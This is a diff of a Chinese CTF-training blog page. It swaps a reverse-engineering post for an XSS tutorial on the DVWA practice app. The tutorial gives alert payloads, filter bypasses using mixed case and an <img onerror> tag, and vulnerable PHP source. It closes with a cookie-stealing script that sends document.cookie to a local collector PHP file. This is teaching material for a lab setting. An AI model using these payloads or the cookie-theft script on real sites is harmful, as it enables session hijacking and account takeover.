@@ -6,30 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Bin(三) | ckf&#39;s blog</title>
+  <title>web(四) | ckf&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="简介：集训Day6，主要是通过例题学习">
-<meta name="keywords" content="ctf,Bin">
+  <meta name="description" content="简介：集训Day9，XSS漏洞原理与利用">
+<meta name="keywords" content="ctf,web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Bin(三)">
-<meta property="og:url" content="http://yoursite.com/2018/07/05/Bin-三/index.html">
+<meta property="og:title" content="web(四)">
+<meta property="og:url" content="http://yoursite.com/2018/07/08/web-四/index.html">
 <meta property="og:site_name" content="ckf&#39;s blog">
-<meta property="og:description" content="简介：集训Day6，主要是通过例题学习">
+<meta property="og:description" content="简介：集训Day9，XSS漏洞原理与利用">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005Z7H2Agy1fsyu7vw5jsj318b0lmdop.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1fsyubjozixj317c0i7n4t.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005Z7H2Agy1fsyue0kyokj312g0cbjvf.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1fsyufm0uuwj31110du43j.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/005Z7H2Agy1fsyult06exj31ab0l27be.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005Z7H2Agy1fsyun7fua7j31290g30yj.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1fsyutpkcmyj31a70kewmk.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/005Z7H2Agy1fsyuv3vj7zj30rj0cadhz.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005Z7H2Agy1fsyuxks0uoj31120jytem.jpg">
-<meta property="og:updated_time" content="2018-07-06T07:46:52.369Z">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft2gamjabtj30vd0ggq4m.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft2gbs52qhj30vt0d5aat.jpg">
+<meta property="og:updated_time" content="2018-07-08T06:55:14.084Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Bin(三)">
-<meta name="twitter:description" content="简介：集训Day6，主要是通过例题学习">
-<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/005Z7H2Agy1fsyu7vw5jsj318b0lmdop.jpg">
+<meta name="twitter:title" content="web(四)">
+<meta name="twitter:description" content="简介：集训Day9，XSS漏洞原理与利用">
+<meta name="twitter:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft2gamjabtj30vd0ggq4m.jpg">
   
     <link rel="alternative" href="/atom.xml" title="ckf&#39;s blog" type="application/atom+xml">
   
@@ -167,145 +160,90 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Bin-三" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-web-四" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Bin(三)
+      web(四)
     </h1>
   
 
         
-        <a href="/2018/07/05/Bin-三/" class="archive-article-date">
-  	<time datetime="2018-07-05T02:37:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-05</time>
+        <a href="/2018/07/08/web-四/" class="archive-article-date">
+  	<time datetime="2018-07-08T05:04:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-08</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>简介：集训Day6，主要是通过例题学习<br><a id="more"></a></p>
-<h1 id="汇编的控制语句"><a href="#汇编的控制语句" class="headerlink" title="汇编的控制语句"></a>汇编的控制语句</h1><p>汇编没有像C语言一样有着清晰的结构层次，无论是switch、if还是while都是通过cmp，和jmp两种指令来进行控制</p>
-<p>常见跳转指令</p>
-<table>
-<thead>
-<tr>
-<th>指令名</th>
-<th>实现功能</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>ja</td>
-<td>大于时跳转 &gt;</td>
-</tr>
-<tr>
-<td>jae</td>
-<td>大于等于是跳转 &gt;=</td>
-</tr>
-<tr>
-<td>jb</td>
-<td>小于时跳转 &lt;</td>
-</tr>
-<tr>
-<td>jbe</td>
-<td>小于等于时跳转 &lt;=</td>
-</tr>
-<tr>
-<td>je</td>
-<td>相等时跳转 ==</td>
-</tr>
-<tr>
-<td>jna</td>
-<td>不大于时跳转 &lt;=</td>
-</tr>
-<tr>
-<td>jnb</td>
-<td>不小于时跳转 &gt;=</td>
-</tr>
-<tr>
-<td>jnbe</td>
-<td>不小于或等于时跳转 &gt;</td>
-</tr>
-<tr>
-<td>jne</td>
-<td>不等于时跳转 !=</td>
-</tr>
-<tr>
-<td>jg</td>
-<td>大于（有符号）&gt;</td>
-</tr>
-<tr>
-<td>jge</td>
-<td>大于等于（有符号）</td>
-</tr>
-<tr>
-<td>jl</td>
-<td>小于（有符号）&lt;</td>
-</tr>
-<tr>
-<td>jle</td>
-<td>小于等于（有符号）&lt;=</td>
-</tr>
-<tr>
-<td>jng</td>
-<td>不大于（有符号）&lt;=</td>
-</tr>
-<tr>
-<td>jnge</td>
-<td>不大于等于（有符号）&lt;</td>
-</tr>
-<tr>
-<td>jnl</td>
-<td>不小于 &gt;=</td>
-</tr>
-<tr>
-<td>jnle</td>
-<td>不小于等于（有符号）&gt;</td>
-</tr>
-<tr>
-<td>jns</td>
-<td>无符号</td>
-</tr>
-<tr>
-<td>jnz</td>
-<td>zf非零</td>
-</tr>
-<tr>
-<td>js</td>
-<td>如果带符号</td>
-</tr>
-<tr>
-<td>jz</td>
-<td>zf为0</td>
-</tr>
-</tbody>
-</table>
-<h1 id="homework-exe"><a href="#homework-exe" class="headerlink" title="homework.exe"></a>homework.exe</h1><hr>
-<p><img src="http://ww3.sinaimg.cn/large/005Z7H2Agy1fsyu7vw5jsj318b0lmdop.jpg" alt=""></p>
-<p>打开exe文件发现要我们进行输入,可通过打印在控制台的文字找到main函数</p>
-<p><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1fsyubjozixj317c0i7n4t.jpg" alt=""></p>
-<p>找到主函数后观察，发现在上面有一串不明字符串，猜测就应该是需要我们输入的flag</p>
-<p><img src="http://ww3.sinaimg.cn/large/005Z7H2Agy1fsyue0kyokj312g0cbjvf.jpg" alt=""></p>
-<p>如图：该字符串为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tnfb&#125;eu&apos;`fgn&#123;b|d0xa3gz6ryjc</span><br></pre></td></tr></table></figure></p>
-<p>跳出输入的时候，我先随意输入了123，F8继续执行<br><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1fsyufm0uuwj31110du43j.jpg" alt=""></p>
-<p>发现会调用strlen()函数，并且与0x1B进行比较</p>
-<p>local.4储存着用户输入字符串的长度</p>
-<p>转换成C语言 ：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(strlen(str)!=27)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;tip:27&quot;)；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>假如输入的字符串长度不等于27就跳转出去<br><img src="http://ww4.sinaimg.cn/large/005Z7H2Agy1fsyult06exj31ab0l27be.jpg" alt=""></p>
-<p>Tnfb}eu’`fgn{b|d0xa3gz6ryjc 长度就是27，验证猜想，于是输入该字符串</p>
-<p><img src="http://ww3.sinaimg.cn/large/005Z7H2Agy1fsyun7fua7j31290g30yj.jpg" alt=""></p>
-<p>F8继续执行，进入一个循环，local.5是循环控制变量，最后与0x1A比较跳转，因此是循环27次，将字符串中的每个字符都进行xor异或变换</p>
-<p><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1fsyutpkcmyj31a70kewmk.jpg" alt=""></p>
-<p>如上图所示，Tnfb}eu’<code>fgn{b|d0xa3gz6ryjc 的异或变换结果是 Today</code>s homework is so easy</p>
-<p><img src="http://ww4.sinaimg.cn/large/005Z7H2Agy1fsyuv3vj7zj30rj0cadhz.jpg" alt=""></p>
-<p>如上图所示，对字符串变换后会与Tnfb}eu’<code>fgn{b|d0xa3gz6ryjc进行strcmp。根据异或对称的性质，我们所需输入的字符串就为Tnfb}eu&#39;</code>fgn{b|d0xa3gz6ryjc异或变换的结果，也就是Today`s homework is so easy</p>
-<p><img src="http://ww3.sinaimg.cn/large/005Z7H2Agy1fsyuxks0uoj31120jytem.jpg" alt=""></p>
-<p>成功！</p>
-<p>未完待更</p>
+        <p>简介：集训Day9，XSS漏洞原理与利用<br><a id="more"></a></p>
+<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><hr>
+<p>XSS攻击全称跨站脚本攻击，XSS在客户端脚本安全中有着举足轻重的位置</p>
+<h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>攻击者通过“html注入”插入恶意脚本或篡改网页，当用户在浏览网页时，就会执行其中的恶意脚本</p>
+<h2 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h2><ol>
+<li>网络钓鱼，盗取各类用户账号</li>
+<li>窃取用户cookie</li>
+<li>强制弹窗</li>
+<li>页面挂马</li>
+<li>升级用户权限，进一步渗透网站</li>
+<li>传播跨站脚本蠕虫</li>
+</ol>
+<h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>常见，广泛但危害性不大，使用已经构造好的恶意URL发送给目标，诱使目标点击出发，只会执行一次</p>
+<p>DVWA例子</p>
+<ol>
+<li>Security-low</li>
+</ol>
+<p>图一：<br><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft2gamjabtj30vd0ggq4m.jpg" alt=""></p>
+<p>如图，该页面会把用户输入的参数直接输出到页面上。如果输入的是一段JS代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; alert(&quot;xss&quot;); &lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>就会发现alert()函数在当前页面被执行了</p>
+<p>图二：<br><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft2gbs52qhj30vt0d5aat.jpg" alt=""></p>
+<p>查看源代码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;Hello &lt;script&gt; alert(&quot;xss&quot;); &lt;/script&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们所输入的Script脚本，已经被写入页面，这就完成了一次XSS攻击</p>
+<ol start="2">
+<li>Security-Medium</li>
+</ol>
+<p>原理相同，只是在原本的基础上加入了针对特定字符的过滤，需要进行绕过</p>
+<p>页面源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>分析后发现是使用了黑名单过滤，我们只需要利用大小写混用绕过即可</p>
+<p>图三:<br><img src="" alt=""></p>
+<ol start="3">
+<li>Security-High</li>
+</ol>
+<p>页面源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>分析后发现，大小混用绕过已经不可行，得另想办法</p>
+<p>利用img，上传一张不存在的图片，其返回的erro中会附加有script，因此可以输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<p>图四：<br><img src="" alt=""></p>
+<h3 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h3><p>不需要用户点击特定的URL就能执行跨站脚本，攻击者可以事先将恶意JS代码上传或者储存到服务器中，只要受害者浏览包含此恶意的代码页面就会执行恶意代码</p>
+<p>DVWA例子</p>
+<ol>
+<li><p>Security-low<br>没有过滤，可以直接在message栏中输入恶意代码</p>
+</li>
+<li><p>Security-Medium</p>
+</li>
+</ol>
+<p>页面源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发现针对message的过滤很多，对name的过滤较少。但name输入框对长度有限制，可以利用截包，无视其长度限制</p>
+<p>图五:<br><img src="" alt=""></p>
+<p>图六:<br><img src="" alt=""></p>
+<ol start="3">
+<li>Security-High</li>
+</ol>
+<p>与中等难度原理相通，同样是通过在过滤较少的name一栏输入恶意代码，同时绕过方法与反射型high的绕过方法一样</p>
+<p>图七：<br><img src="" alt=""></p>
+<p>成功</p>
+<h2 id="XSS盗用cookie登录"><a href="#XSS盗用cookie登录" class="headerlink" title="XSS盗用cookie登录"></a>XSS盗用cookie登录</h2><ol>
+<li>编写接受cookie的php脚本</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">      $cookie=$_GET[‘cookie’];</span><br><span class="line">      file_put_contents(‘cookie.txt’,$cookie);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>构造攻击盗取cookie脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=‘http://127.0.0.1/dvwa/cookie.php?cookie=’+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
 
       
 
@@ -323,7 +261,7 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Bin</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
         		</li>
       		
 		</ul>
@@ -379,7 +317,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/07/05/Bin-三/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/07/08/web-四/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -393,18 +331,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/07/06/web-三/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          web(三)
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/07/04/web-二/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">web(二)</div>
+    <a href="/2018/07/07/Pwn-一/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Pwn(一)</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -431,7 +360,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#汇编的控制语句"><span class="toc-number">1.</span> <span class="toc-text">汇编的控制语句</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#homework-exe"><span class="toc-number">2.</span> <span class="toc-text">homework.exe</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS漏洞"><span class="toc-number">1.</span> <span class="toc-text">XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用原理："><span class="toc-number">1.1.</span> <span class="toc-text">利用原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害："><span class="toc-number">1.2.</span> <span class="toc-text">危害：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分类："><span class="toc-number">1.3.</span> <span class="toc-text">分类：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-number">1.3.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#储存型XSS"><span class="toc-number">1.3.2.</span> <span class="toc-text">储存型XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS盗用cookie登录"><span class="toc-number">1.4.</span> <span class="toc-text">XSS盗用cookie登录</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
